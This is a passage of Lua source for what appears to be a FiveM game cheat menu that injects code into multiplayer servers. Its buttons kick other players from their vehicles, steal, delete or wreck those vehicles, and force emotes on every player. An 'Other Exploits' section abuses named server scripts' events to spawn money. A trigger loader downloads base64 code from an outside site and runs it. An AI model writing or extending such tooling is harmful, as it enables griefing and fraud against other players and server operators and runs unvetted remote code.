                        label = 'Kick from Vehicle',
                        icon = 'ph-car',
                        desc = 'Kicks selected player from vehicle',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                CreateThread(function()
                                    local targetSid = %d
                                    local ped = GetPlayerPed(GetPlayerFromServerId(targetSid))
                                    local pedvehicle = GetVehiclePedIsIn(ped, false)

                                    if ped and DoesEntityExist(ped) and pedvehicle ~= 0 then
                                        local lastCoords = GetEntityCoords(PlayerPedId())
                                        local reqStart = GetGameTimer()
                                        while (GetGameTimer() - reqStart) < 1000 do
                                            if NetworkHasControlOfEntity(pedvehicle) then break end
                                            NetworkRequestControlOfEntity(pedvehicle)
                                            Wait(0)
                                        end

                                        if not NetworkHasControlOfEntity(pedvehicle) then
                                            SetPedIntoVehicle(PlayerPedId(), pedvehicle, 0)
                                            reqStart = GetGameTimer()
                                            while (GetGameTimer() - reqStart) < 2000 do
                                                if NetworkHasControlOfEntity(pedvehicle) then break end
                                                NetworkRequestControlOfEntity(pedvehicle)
                                                Wait(0)
                                            end
                                        end
                                        Wait(10)

                                        for i = 0, 4 do
                                            DeletePed(ped)
                                        end
                                        Wait(40)

                                        SetPedIntoVehicle(PlayerPedId(), pedvehicle, -1)
                                        Wait(1)

                                        local emptySeat = -1
                                        local seats = {-1, 0, 1, 2}
                                        for _, s in ipairs(seats) do
                                            if IsVehicleSeatFree(pedvehicle, s) then
                                                emptySeat = s
                                                break
                                            end
                                        end

                                        SetPedIntoVehicle(PlayerPedId(), pedvehicle, emptySeat)
                                        Wait(1)
                                        SetPedIntoVehicle(PlayerPedId(), pedvehicle, -1)
                                        Wait(450)
                                        ClearPedTasksImmediately(PlayerPedId())
                                        Wait(100)

                                        TaskLeaveAnyVehicle(PlayerPedId())
                                        Wait(1)
                                        ClearPedTasks(PlayerPedId())
                                        ClearPedTasksImmediately(PlayerPedId())
                                        Wait(100)

                                        SetEntityCoordsNoOffset(PlayerPedId(), lastCoords.x, lastCoords.y, lastCoords.z, false, false, false, false)
                                        FreezeEntityPosition(PlayerPedId(), false)
                                        ClearPedTasks(PlayerPedId())
                                        ClearPedTasksImmediately(PlayerPedId())
                                        SetEntityVisible(PlayerPedId(), true, true)
                                        SetEntityCollision(PlayerPedId(), true, true)
                                        SetEntityInvincible(PlayerPedId(), false)
                                        SetPedCanRagdoll(PlayerPedId(), true)
                                        SetPedConfigFlag(PlayerPedId(), 32, false)

                                        Wait(50)
                                        local syncCoords = GetEntityCoords(PlayerPedId())
                                        SetEntityCoordsNoOffset(PlayerPedId(), syncCoords.x + 0.1, syncCoords.y + 0.1, syncCoords.z, false, false, false, false)
                                        Wait(50)
                                        SetEntityCoordsNoOffset(PlayerPedId(), syncCoords.x - 0.1, syncCoords.y - 0.1, syncCoords.z, false, false, false, false)
                                        Wait(50)
                                        SetEntityCoordsNoOffset(PlayerPedId(), lastCoords.x, lastCoords.y, lastCoords.z, false, false, false, false)
                                        Wait(200)
                                        FreezeEntityPosition(PlayerPedId(), false)
                                        SetEntityVisible(PlayerPedId(), true, true)
                                        ClearPedTasksImmediately(PlayerPedId())
                                        Wait(100)
                                    end
                                end)
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Steal Vehicle',
                        icon = 'ph-car',
                        desc = 'Steals selected player vehicle',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                local targetID = %d
                                local me = PlayerPedId()
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) and IsPedInAnyVehicle(targetPed, false) then
                                    local vehicle = GetVehiclePedIsUsing(targetPed)
                                    if DoesEntityExist(vehicle) then
                                        local driver = GetPedInVehicleSeat(vehicle, -1)
                                        if driver ~= 0 and DoesEntityExist(driver) then
                                            NetworkRequestControlOfEntity(vehicle)
                                            ClearPedTasksImmediately(driver)
                                        end
                                        TaskEnterVehicle(me, vehicle, 1200, -1, 2.0, 16, 0)
                                    end
                                end
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'NPC Hijack Vehicle',
                        icon = 'ph-car',
                        desc = 'NPC Hijacks selected player vehicle',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                local targetID = %d
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) and IsPedInAnyVehicle(targetPed, false) then
                                    local vehicle = GetVehiclePedIsUsing(targetPed)
                                    if DoesEntityExist(vehicle) then
                                        local driver = GetPedInVehicleSeat(vehicle, -1)
                                        if driver ~= 0 and DoesEntityExist(driver) then
                                            NetworkRequestControlOfEntity(vehicle)
                                            ClearPedTasksImmediately(driver)
                                        end

                                        local pedModel = GetHashKey("a_m_m_skater_01")
                                        RequestModel(pedModel)
                                        while not HasModelLoaded(pedModel) do Wait(0) end

                                        local npc = CreatePedInsideVehicle(vehicle, 4, pedModel, -1, false, false)
                                        SetModelAsNoLongerNeeded(pedModel)
                                        if DoesEntityExist(npc) then
                                            TaskVehicleDriveWander(npc, vehicle, 60.0, 786603)
                                        end
                                    end
                                end
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Bring Vehicle',
                        icon = 'ph-car',
                        desc = 'Brings selected player vehicle',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                local targetID = %d
                                local me = PlayerPedId()
                                local myCoords = GetEntityCoords(me)
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) and IsPedInAnyVehicle(targetPed, false) then
                                    local vehicle = GetVehiclePedIsUsing(targetPed)
                                    if DoesEntityExist(vehicle) then
                                        local driver = GetPedInVehicleSeat(vehicle, -1)
                                        if driver ~= 0 and DoesEntityExist(driver) then
                                            NetworkRequestControlOfEntity(vehicle)
                                            ClearPedTasksImmediately(driver)
                                        end
                                        local start = GetGameTimer()
                                        while not NetworkHasControlOfEntity(vehicle) and GetGameTimer() - start < 1000 do
                                            NetworkRequestControlOfEntity(vehicle)
                                            Wait(0)
                                        end
                                        SetEntityCoordsNoOffset(vehicle, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                                    end
                                end
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Delete Vehicle',
                        icon = 'ph-car',
                        desc = 'Deletes selected player vehicle',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                local targetID = %d
                                local me = PlayerPedId()
                                local myCoords = GetEntityCoords(me)
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) and IsPedInAnyVehicle(targetPed, false) then
                                    local vehicle = GetVehiclePedIsUsing(targetPed)
                                    if DoesEntityExist(vehicle) then
                                        local driver = GetPedInVehicleSeat(vehicle, -1)
                                        if driver ~= 0 and DoesEntityExist(driver) then
                                            NetworkRequestControlOfEntity(vehicle)
                                            ClearPedTasksImmediately(driver)
                                        end
                                        local start = GetGameTimer()
                                        while not NetworkHasControlOfEntity(vehicle) and GetGameTimer() - start < 1000 do
                                            NetworkRequestControlOfEntity(vehicle)
                                            Wait(0)
                                        end
                                        DeleteEntity(vehicle)
                                        ClearPedTasksImmediately(me)
                                        SetEntityCoordsNoOffset(me, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                                    end
                                end
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Void Vehicle',
                        icon = 'ph-car',
                        desc = 'Voids selected player vehicle',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                local targetID = %d
                                local me = PlayerPedId()
                                local myCoords = GetEntityCoords(me)
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) and IsPedInAnyVehicle(targetPed, false) then
                                    local vehicle = GetVehiclePedIsUsing(targetPed)
                                    if DoesEntityExist(vehicle) then
                                        local driver = GetPedInVehicleSeat(vehicle, -1)
                                        if driver ~= 0 and DoesEntityExist(driver) then
                                            NetworkRequestControlOfEntity(vehicle)
                                            ClearPedTasksImmediately(driver)
                                        end
                                        local start = GetGameTimer()
                                        while not NetworkHasControlOfEntity(vehicle) and GetGameTimer() - start < 1000 do
                                            NetworkRequestControlOfEntity(vehicle)
                                            Wait(0)
                                        end
                                        SetEntityCoordsNoOffset(vehicle, -1600.0, -1600.0, 0.0, false, false, false)
                                        ClearPedTasksImmediately(me)
                                        SetEntityCoordsNoOffset(me, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                                    end
                                end
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Flip Vehicle',
                        icon = 'ph-car',
                        desc = 'Flips selected player vehicle',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))
                            if not targetPed or targetPed == 0 then
                                showNotify("Selected player ped is invalid.", 'error')
                                return
                            end

                            if not IsPedInAnyVehicle(targetPed, false) then
                                showNotify("Selected player is not in any vehicle.", 'error')
                                return
                            end

                            local vehicle = GetVehiclePedIsUsing(targetPed)
                            if vehicle == 0 or not DoesEntityExist(vehicle) then
                                showNotify("Car model is empty.", 'error')
                                return
                            end

                            local driver = GetPedInVehicleSeat(vehicle, -1)
                            if driver ~= 0 and DoesEntityExist(driver) then
                                KickVehicleDriver(vehicle)
                                Wait(150)
                            end

                            NetworkRequestControlOfEntity(vehicle)
                            local t = GetGameTimer()
                            while not NetworkHasControlOfEntity(vehicle) and GetGameTimer() - t < 1000 do
                                Wait(0)
                            end

                            SetEntityRotation(vehicle, 180.0, 0.0, GetEntityHeading(vehicle), 2, true)
                        end
                    },
                    {
                        type = 'button',
                        label = 'Fling Vehicle',
                        icon = 'ph-car',
                        desc = 'Flings selected player vehicle',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))
                            if not targetPed or targetPed == 0 then
                                showNotify("Selected player ped is invalid.", 'error')
                                return
                            end

                            if not IsPedInAnyVehicle(targetPed, false) then
                                showNotify("Selected player is not in any vehicle.", 'error')
                                return
                            end

                            local vehicle = GetVehiclePedIsUsing(targetPed)
                            if vehicle == 0 or not DoesEntityExist(vehicle) then
                                showNotify("Car model is empty.", 'error')
                                return
                            end

                            local driver = GetPedInVehicleSeat(vehicle, -1)
                            if driver ~= 0 and DoesEntityExist(driver) then
                                KickVehicleDriver(vehicle)
                                Wait(150)
                            end

                            NetworkRequestControlOfEntity(vehicle)
                            local t = GetGameTimer()
                            while not NetworkHasControlOfEntity(vehicle) and GetGameTimer() - t < 1000 do
                                Wait(0)
                            end

                            SetEntityVelocity(vehicle, 0.0, 0.0, 0.0)
                            ApplyForceToEntityCenterOfMass(
                                vehicle,
                                1,
                                0.0, 0.0, 120.0,
                                false, true, true, false
                            )
                        end
                    },
                    {
                        type = 'button',
                        label = 'Break Vehicle',
                        icon = 'ph-car',
                        desc = 'Breaks selected player vehicle',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))
                            if not targetPed or targetPed == 0 then
                                showNotify("Selected player ped is invalid.", 'error')
                                return
                            end

                            if not IsPedInAnyVehicle(targetPed, false) then
                                showNotify("Selected player is not in any vehicle.", 'error')
                                return
                            end

                            local vehicle = GetVehiclePedIsUsing(targetPed)
                            if vehicle == 0 or not DoesEntityExist(vehicle) then
                                showNotify("Car model is empty.", 'error')
                                return
                            end

                            local driver = GetPedInVehicleSeat(vehicle, -1)
                            if driver ~= 0 and DoesEntityExist(driver) then
                                KickVehicleDriver(vehicle)
                                Wait(150)
                            end

                            NetworkRequestControlOfEntity(vehicle)
                            local t = GetGameTimer()
                            while not NetworkHasControlOfEntity(vehicle) and GetGameTimer() - t < 1000 do
                                Wait(0)
                            end

                            for i = 0, 7 do
                                SetVehicleTyreBurst(vehicle, i, true, 1000.0)
                            end

                            for i = 0, 7 do
                                SmashVehicleWindow(vehicle, i)
                            end

                            SetVehicleEngineHealth(vehicle, -4000.0)
                            SetVehicleBodyHealth(vehicle, -4000.0)
                            SetVehiclePetrolTankHealth(vehicle, -4000.0)

                            SetVehicleEngineOn(vehicle, false, true, true)
                            SetVehicleUndriveable(vehicle, true)
                        end
                    },
                    {
                        type = 'button',
                        label = 'Remove Wheels',
                        icon = 'ph-wheel',
                        desc = 'Removes selected player wheels',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                CreateThread(function()
                                    local targetSid = %d
                                    local ped = GetPlayerPed(GetPlayerFromServerId(targetSid))
                                    local pedvehicle = GetVehiclePedIsIn(ped, false)

                                    if DoesEntityExist(ped) and pedvehicle ~= 0 then
                                        local lastCoords = GetEntityCoords(PlayerPedId())
                                        SetPedIntoVehicle(PlayerPedId(), pedvehicle, 0)

                                        local reqStart = GetGameTimer()
                                        while (GetGameTimer() - reqStart) < 2000 do
                                            if NetworkHasControlOfEntity(pedvehicle) then break end
                                            NetworkRequestControlOfEntity(pedvehicle)
                                            Wait(0)
                                        end
                                        Wait(10)

                                        for i = 0, 4 do
                                            DeletePed(ped)
                                        end
                                        Wait(40)

                                        SetPedIntoVehicle(PlayerPedId(), pedvehicle, -1)
                                        Wait(1)

                                        local emptySeat = -1
                                        local seats = {-1, 0, 1, 2}
                                        for _, s in ipairs(seats) do
                                            if IsVehicleSeatFree(pedvehicle, s) then
                                                emptySeat = s
                                                break
                                            end
                                        end

                                        SetPedIntoVehicle(PlayerPedId(), pedvehicle, emptySeat)
                                        Wait(1)
                                        SetPedIntoVehicle(PlayerPedId(), pedvehicle, -1)
                                        Wait(450)
                                        ClearPedTasksImmediately(PlayerPedId())
                                        Wait(100)

                                        if NetworkHasControlOfEntity(pedvehicle) then
                                            local model = GetEntityModel(pedvehicle)
                                            if IsThisModelABike(model) or IsThisModelAQuadbike(model) then
                                                BreakOffVehicleWheel(pedvehicle, 0, false, false, false, false)
                                            else
                                                for i = 0, 4 do
                                                    BreakOffVehicleWheel(pedvehicle, i, false, false, false, false)
                                                    Wait(0)
                                                end
                                            end
                                            Wait(500)
                                            TaskLeaveAnyVehicle(PlayerPedId())
                                        end

                                        Wait(1)
                                        ClearPedTasks(PlayerPedId())
                                        ClearPedTasksImmediately(PlayerPedId())
                                        Wait(100)

                                        SetEntityCoordsNoOffset(PlayerPedId(), lastCoords.x, lastCoords.y, lastCoords.z, false, false, false, false)
                                        FreezeEntityPosition(PlayerPedId(), false)
                                        ClearPedTasks(PlayerPedId())
                                        ClearPedTasksImmediately(PlayerPedId())
                                        SetEntityVisible(PlayerPedId(), true, true)
                                        SetEntityCollision(PlayerPedId(), true, true)
                                        SetEntityInvincible(PlayerPedId(), false)
                                        SetPedCanRagdoll(PlayerPedId(), true)
                                        SetPedConfigFlag(PlayerPedId(), 32, false)

                                        Wait(50)
                                        local syncCoords = GetEntityCoords(PlayerPedId())
                                        SetEntityCoordsNoOffset(PlayerPedId(), syncCoords.x + 0.1, syncCoords.y + 0.1, syncCoords.z, false, false, false, false)
                                        Wait(50)
                                        SetEntityCoordsNoOffset(PlayerPedId(), syncCoords.x - 0.1, syncCoords.y - 0.1, syncCoords.z, false, false, false, false)
                                        Wait(50)
                                        SetEntityCoordsNoOffset(PlayerPedId(), lastCoords.x, lastCoords.y, lastCoords.z, false, false, false, false)
                                        Wait(200)
                                        FreezeEntityPosition(PlayerPedId(), false)
                                        SetEntityVisible(PlayerPedId(), true, true)
                                        ClearPedTasksImmediately(PlayerPedId())
                                        Wait(100)
                                    end
                                end)
                            ]], targetSid))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Remove Doors',
                        onConfirm = function()
                            local targetSid
                            for serverId, checked in pairs(CPlayers or {}) do
                                if checked then
                                    targetSid = serverId
                                    break
                                end
                            end
                            if not targetSid then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            executeCode('any', string.format([[
                                CreateThread(function()
                                    local targetSid = %d
                                    local ped = GetPlayerPed(GetPlayerFromServerId(targetSid))
                                    local pedvehicle = GetVehiclePedIsIn(ped, false)

                                    if DoesEntityExist(ped) and pedvehicle ~= 0 then
                                        local lastCoords = GetEntityCoords(PlayerPedId())
                                        SetPedIntoVehicle(PlayerPedId(), pedvehicle, 0)

                                        local reqStart = GetGameTimer()
                                        while (GetGameTimer() - reqStart) < 2000 do
                                            if NetworkHasControlOfEntity(pedvehicle) then break end
                                            NetworkRequestControlOfEntity(pedvehicle)
                                            Wait(0)
                                        end
                                        Wait(10)

                                        for i = 0, 4 do
                                            DeletePed(ped)
                                        end
                                        Wait(40)

                                        SetPedIntoVehicle(PlayerPedId(), pedvehicle, -1)
                                        Wait(1)

                                        local emptySeat = -1
                                        local seats = {-1, 0, 1, 2}
                                        for _, s in ipairs(seats) do
                                            if IsVehicleSeatFree(pedvehicle, s) then
                                                emptySeat = s
                                                break
                                            end
                                        end

                                        SetPedIntoVehicle(PlayerPedId(), pedvehicle, emptySeat)
                                        Wait(1)
                                        SetPedIntoVehicle(PlayerPedId(), pedvehicle, -1)
                                        Wait(450)
                                        ClearPedTasksImmediately(PlayerPedId())
                                        Wait(100)

                                        if NetworkHasControlOfEntity(pedvehicle) then
                                            Wait(500)
                                            for i = 0, 7 do
                                                SetVehicleDoorBroken(pedvehicle, i, false)
                                                if i <= 4 then
                                                    BreakOffVehicleWheel(pedvehicle, i, false, false, false, false)
                                                end
                                                Wait(0)
                                            end
                                            SetVehicleEngineHealth(pedvehicle, -4000)
                                            Wait(500)
                                            TaskLeaveAnyVehicle(PlayerPedId())
                                        end

                                        Wait(1)
                                        ClearPedTasks(PlayerPedId())
                                        ClearPedTasksImmediately(PlayerPedId())
                                        Wait(100)

                                        SetEntityCoordsNoOffset(PlayerPedId(), lastCoords.x, lastCoords.y, lastCoords.z, false, false, false, false)
                                        FreezeEntityPosition(PlayerPedId(), false)
                                        ClearPedTasks(PlayerPedId())
                                        ClearPedTasksImmediately(PlayerPedId())
                                        SetEntityVisible(PlayerPedId(), true, true)
                                        SetEntityCollision(PlayerPedId(), true, true)
                                        SetEntityInvincible(PlayerPedId(), false)
                                        SetPedCanRagdoll(PlayerPedId(), true)
                                        SetPedConfigFlag(PlayerPedId(), 32, false)

                                        Wait(50)
                                        local syncCoords = GetEntityCoords(PlayerPedId())
                                        SetEntityCoordsNoOffset(PlayerPedId(), syncCoords.x + 0.1, syncCoords.y + 0.1, syncCoords.z, false, false, false, false)
                                        Wait(50)
                                        SetEntityCoordsNoOffset(PlayerPedId(), syncCoords.x - 0.1, syncCoords.y - 0.1, syncCoords.z, false, false, false, false)
                                        Wait(50)
                                        SetEntityCoordsNoOffset(PlayerPedId(), lastCoords.x, lastCoords.y, lastCoords.z, false, false, false, false)
                                        Wait(200)
                                        FreezeEntityPosition(PlayerPedId(), false)
                                        SetEntityVisible(PlayerPedId(), true, true)
                                        ClearPedTasksImmediately(PlayerPedId())
                                        Wait(100)
                                    end
                                end)
                            ]], targetSid))
                        end
                    }

                }
            },
            {
                name = 'Triggers',
                submenu = {
                    {
                        label = 'Goto Trigger Site',
                        type = 'button',
                        desc = 'Opens a goolge tab to the custom triggers tab',
                        onConfirm = function()
                            MachoInjectJavaScript([[
        window.invokeNative('openUrl', 'https://risklua.org/');
    ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Load Custom Triggers',
                        onConfirm = function()
                            local discordId = authenticatedDiscordId or "0"
                            local requestUrl = "https://risklua.org/api/scripts?auth_key=" .. urlEncode(discordId)
                            local response = MachoWebRequest(requestUrl)
                            if response and response ~= "" then
                                local data = json.decode(response)
                                if data and data.scripts then
                                    if #data.scripts > 0 then
                                        local triggerMenu = { { label = 'Available Scripts', type = 'divider' } }
                                        for _, script in ipairs(data.scripts) do
                                            triggerMenu[#triggerMenu + 1] = {
                                                label = script.name,
                                                type = 'button',
                                                onConfirm = function()
                                                    local code = base64Decode(script.code)
                                                    executeCode('any', code)
                                                    showNotify('Executed trigger: ' .. script.name, 'success')
                                                end
                                            }
                                        end
                                        for i, item in ipairs(activeMenu) do
                                            if item.label == 'Load Custom Triggers' then
                                                while #activeMenu > i do table.remove(activeMenu) end
                                                for _, newTrigger in ipairs(triggerMenu) do
                                                    table.insert(activeMenu,
                                                        newTrigger)
                                                end
                                                break
                                            end
                                        end
                                        setCurrent()
                                        showNotify("Triggers loaded from API", "success")
                                    else
                                        showNotify("No Scripts Found", "error")
                                    end
                                end
                            end
                        end
                    }
                }
            },
            {
                name = 'Configs',
                submenu = {
                    {
                        type = 'button',
                        label = 'Save Current Config',
                        onConfirm = function()
                            showInput('Config Name to Save', '', function(cName)
                                if cName and #cName > 0 then
                                    local discordId = authenticatedDiscordId or "0"
                                    local pData = ConfigUtils.exportState(MenuConfig)

                                    local reqUrl = "https://risklua.org/api/configs/create?auth_key=" ..
                                        ConfigUtils.urlEncode(discordId) ..
                                        "&config_name=" .. ConfigUtils.urlEncode(cName) .. "&keybinds_data=" .. pData

                                    local rep = MachoWebRequest(reqUrl)
                                    showNotify('Config saved as: ' .. cName, 'success')

                                    local succ, rData = pcall(json.decode, rep)
                                    if succ and rData and rData.success then
                                        for i, item in ipairs(activeMenu) do
                                            if item.label == 'Load Configs' and type(item.onConfirm) == "function" then
                                                item.onConfirm()
                                                break
                                            end
                                        end
                                    end
                                end
                            end, 'typeable')
                        end
                    },
                    {
                        type = 'button',
                        label = 'Load Configs',
                        onConfirm = function()
                            local discordId = authenticatedDiscordId or "0"
                            local reqUrl = "https://risklua.org/api/configs?auth_key=" ..
                                ConfigUtils.urlEncode(discordId)

                            local rep = MachoWebRequest(reqUrl)

                            if rep and rep ~= "" then
                                local succ, rData = pcall(json.decode, rep)
                                if succ and rData and rData.success and rData.configs then
                                    if #rData.configs > 0 then
                                        local cMenu = {
                                            { label = 'Available Configs', type = 'divider' }
                                        }

                                        for _, cfg in ipairs(rData.configs) do
                                            cMenu[#cMenu + 1] = {
                                                label = cfg.name,
                                                type = "scroll",
                                                options = {
                                                    { label = "Load",   value = "load" },
                                                    { label = "Update", value = "update" },
                                                    { label = "Delete", value = "delete" }
                                                },
                                                selected = 1,
                                                onConfirm = function(data)
                                                    if not data or not data.value then return end

                                                    if data.value == "load" then
                                                        local discordId = authenticatedDiscordId or "0"
                                                        local getUrl = "https://risklua.org/api/configs/" ..
                                                            tostring(cfg.id) ..
                                                            "?auth_key=" .. ConfigUtils.urlEncode(discordId)
                                                        local loadRep = MachoWebRequest(getUrl)
                                                        if loadRep and loadRep ~= "" then
                                                            local succL, lData = pcall(json.decode, loadRep)
                                                            if succL and lData and lData.success and lData.config and lData.config.keybinds then
                                                                if lData.config.keybinds ~= "" then
                                                                    ConfigUtils.importState(lData.config.keybinds,
                                                                        MenuConfig)
                                                                    showNotify('Loaded Config: ' .. cfg.name, 'success')
                                                                else
                                                                    showNotify('Config is empty', 'error')
                                                                end
                                                            else
                                                                showNotify('Failed to fetch config data', 'error')
                                                            end
                                                        else
                                                            showNotify('Failed to connect to server', 'error')
                                                        end
                                                    elseif data.value == "update" then
                                                        local pData = ConfigUtils.exportState(MenuConfig)
                                                        local discordId = authenticatedDiscordId or "0"

                                                        local updateUrl = "https://risklua.org/api/configs/update/" ..
                                                            tostring(cfg.id) ..
                                                            "?auth_key=" ..
                                                            ConfigUtils.urlEncode(discordId) ..
                                                            "&keybinds_data=" .. pData

                                                        local updateRep = MachoWebRequest(updateUrl)
                                                        showNotify('Updated Config: ' .. cfg.name, 'success')
                                                    elseif data.value == "delete" then
                                                        local discordId = authenticatedDiscordId or "0"
                                                        local delUrl = "https://risklua.org/api/configs/delete/" ..
                                                            tostring(cfg.id) ..
                                                            "?auth_key=" .. ConfigUtils.urlEncode(discordId)

                                                        local delRep = MachoWebRequest(delUrl)
                                                        showNotify('Deleted: ' .. cfg.name, 'success')

                                                        for d = 1, #activeMenu do
                                                            if activeMenu[d].label == cfg.name then
                                                                table.remove(activeMenu, d)
                                                                if activeIndex > #activeMenu then
                                                                    activeIndex = #
                                                                        activeMenu
                                                                end

                                                                if activeMenu[activeIndex] and (activeMenu[activeIndex].type == "divider" or activeMenu[activeIndex].hidden) then
                                                                    createActiveIndex(-1)
                                                                else
                                                                    setCurrent()
                                                                end
                                                                break
                                                            end
                                                        end
                                                    end
                                                end
                                            }
                                        end

                                        for i, item in ipairs(activeMenu) do
                                            if item.label == 'Load Configs' then
                                                while #activeMenu > i do table.remove(activeMenu) end
                                                for _, nm in ipairs(cMenu) do table.insert(activeMenu, nm) end
                                                break
                                            end
                                        end
                                        setCurrent()
                                        showNotify('Fetched Configs', 'success')
                                    else
                                        local cMenu = { { label = 'Available Configs', type = 'divider' } }
                                        for i, item in ipairs(activeMenu) do
                                            if item.label == 'Load Configs' then
                                                while #activeMenu > i do table.remove(activeMenu) end
                                                for _, nm in ipairs(cMenu) do table.insert(activeMenu, nm) end
                                                break
                                            end
                                        end
                                        setCurrent()
                                        showNotify('No configs saved yet', 'error')
                                    end
                                end
                            else
                                showNotify('Failed to fetch configs', 'error')
                            end
                        end
                    }
                }
            }
        }
    },
    {
        label = 'Events',
        icon = 'ph-lightning',
        type = 'submenu',
        tabs = {
            {
                name = 'Main',
                submenu = {
                    {
                        label = "txAdmin Ids",
                        type = 'checkbox',
                        desc = "Show player IDs above heads",
                        onConfirm = function(checked)
                            setTxAdminIds(checked)
                        end
                    },
                    {
                        label = "txAdmin Mode",
                        type = 'scroll',
                        desc = "Set txAdmin player mode",
                        selected = 1,
                        options = {
                            { label = 'None',      value = 'none' },
                            { label = 'Noclip',    value = 'noclip' },
                            { label = 'SuperJump', value = 'superjump' },
                            { label = 'Godmode',   value = 'godmode' },
                        },
                        onConfirm = function(data)
                            setTxAdminMode(data.value)
                        end
                    },
                    { type = 'divider', label = 'Other Exploits' },
                    {
                        label = 'Spawn money',
                        type = 'button',
                        icon = 'ph-money',
                        onConfirm = function()
                            CreateThread(function()
                                Wait(250)
                                showInput("Enter Amount", "1", function(amountInput)
                                    local amount = tonumber(amountInput)
                                    if not amount or amount <= 0 then return end
                                    if GetResourceState("codewave-sneaker-phone") == "started" then
                                        executeCode("codewave-sneaker-phone", string.format([[
                                        setBypass(_G.TriggerEvent, 'delivery:completeDeliveryShoes', %d)
                                    ]], amount))
                                    elseif GetResourceState("codewave-handbag-phone") == "started" then
                                        executeCode("codewave-handbag-phone", string.format([[
                                        setBypass(_G.TriggerEvent, 'delivery:completeDeliveryhandbags', %d)
                                    ]], amount))
                                    elseif GetResourceState("codewave-wigs-v3-phone") == "started" then
                                        executeCode("codewave-wigs-v3-phone", string.format([[
                                        setBypass(_G.TriggerEvent, 'delivery:completeDeliveryWigss', %d)
                                    ]], amount))
                                    elseif GetResourceState("codewave-nails-phone") == "started" then
                                        executeCode("codewave-nails-phone", string.format([[
                                        setBypass(_G.TriggerEvent, 'delivery:completeDeliveryEvent', %d)
                                    ]], amount))
                                    elseif GetResourceState("codewave-lashes-phone") == "started" then
                                        executeCode("codewave-lashes-phone", string.format([[
                                        setBypass(_G.TriggerEvent, 'delivery:giveRewardlashes', %d)
                                    ]], amount))
                                    else
                                        showNotify("No supported money script found.", "error")
                                    end
                                end, "typeable")
                            end)
                        end
                    },
                    {
                        label = 'Bring Players To Me - Trap Rp',
                        type = 'button',
                            onConfirm = function()
                                executeCode('any', [[
                                local players = GetActivePlayers()
                                for _, playerId in ipairs(players) do
                                    local targetServerId = GetPlayerServerId(playerId)
                                    TriggerServerEvent('ServerValidEmote', targetServerId, 'pb__fuckitupv2.1b', 'pb__fuckitupv2.1b')
                                end
                            ]])
                        end
                    },
                    {
                        label = 'Make Player Swin - Fivestar',
                        type = 'button',
                        onConfirm = function()
                            executeCode('any', [[
                            local players = GetActivePlayers()
                            for _, playerId in ipairs(players) do
                                local targetServerId = GetPlayerServerId(playerId)
                                TriggerServerEvent('rpemotes:server:confirmEmote', targetServerId, 'psnowl', 'psnowl')
                            end
                        ]])
                        end
                    },
